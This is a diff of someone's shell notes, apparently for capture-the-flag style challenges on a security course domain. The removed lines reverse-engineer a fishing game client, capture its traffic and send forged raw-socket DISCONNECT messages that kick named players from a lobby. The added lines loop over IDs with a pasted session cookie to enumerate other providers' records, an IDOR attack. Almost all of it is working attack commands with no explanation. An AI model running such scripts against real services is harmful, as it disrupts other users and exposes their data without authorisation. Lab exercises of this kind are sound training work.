@@ -1,49 +1,7 @@
-
-
-
-cd ~/Downloads
-strings ElEstanqueDePepe-linux* | grep -iE "GET /|Sec-WebSocket|Upgrade:|Host:|HTTP/1|wss?://|:8|:9|:3[0-9]{3}|/game|/ws|/lobby|/socket" | sort -u | head -40
-
-strings ElEstanqueDePepe-linux* | grep -E "SEND_MSG|GET_LOBBY|JOIN|%s|\{|\":|name|player|user|id" | grep -iv "glfw\|vulkan\|x11\|xcb\|egl" | head -40
-
-sudo tcpdump -i any -A -s0 host pesca.shared.softwareseguro.com.ar or host $(dig +short pesca.shared.softwareseguro.com.ar | head -1) -w ~/pesca.pcap &
-
-
-strings ~/pesca.pcap | grep -iE "SEND_MSG|GET_LOBBY|JOIN|gochi|LOBBY|chat|\{" | head -40
-
-
-sudo tcpdump -i any -A -s0 -w ~/pesca.pcap host pesca.shared.softwareseguro.com.ar
-
-
-strings ~/pesca.pcap | grep -iE "JOIN|CAST|REEL|DISCONNECT|Jugador83|gochi|SEND_MSG|:" | grep -iv "glfw\|vulkan\|http/\|host:" | head -40
-
-
-strings ~/pesca.pcap | grep -iE "Sec-WebSocket|Upgrade|GET |HTTP/" | head
-
-
-
-# ver puerto y protocolo en el pcap
-tcpdump -nr ~/pesca.pcap 2>/dev/null | head -5
-
-# o buscá el puerto en los strings del binario
-strings ElEstanqueDePepe-linux* | grep -iE ":[0-9]{4,5}|port|udp|tcp" | grep -iv glfw | head
-
-echo -n 'LBY-ESKDJE:P97:DISCONNECT;' | ncat pesca.shared.softwareseguro.com.ar PUERTO
-
-
-python3 -c "
-import socket
-s = socket.socket()
-s.connect(('pesca.shared.softwareseguro.com.ar', 6767))
-s.sendall(b'LBY-ESKDJE:P97:DISCONNECT;')
-import time; time.sleep(1)
-print(s.recv(4096).decode(errors='replace'))
-s.close()
-"
-python3 -c "
-import socket,time
-for pid in ['P97','P25','P36']:
-    s=socket.socket(); s.connect(('pesca.shared.softwareseguro.com.ar',6767))
-    s.sendall(('LBY-ESKDJE:'+pid+':DISCONNECT;').encode()); time.sleep(0.5)
-    print(pid, '->', s.recv(4096).decode(errors='replace')); s.close()
-"
+COOKIE='session=eyJ...PEGÁ_TU_SESSION_COMPLETA'
+BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
+for id in $(seq 1 60); do
+  # sigue el redirect y captura el mensaje "Proveedor #X: N movimientos"
+  r=$(curl -s -b "$COOKIE" -L -X POST "$BASE/movimientos/$id" | grep -oiE "Proveedor #[0-9]+:[^<]*movimientos[^<]*")
+  [ -n "$r" ] && echo "id=$id -> $r"
+done
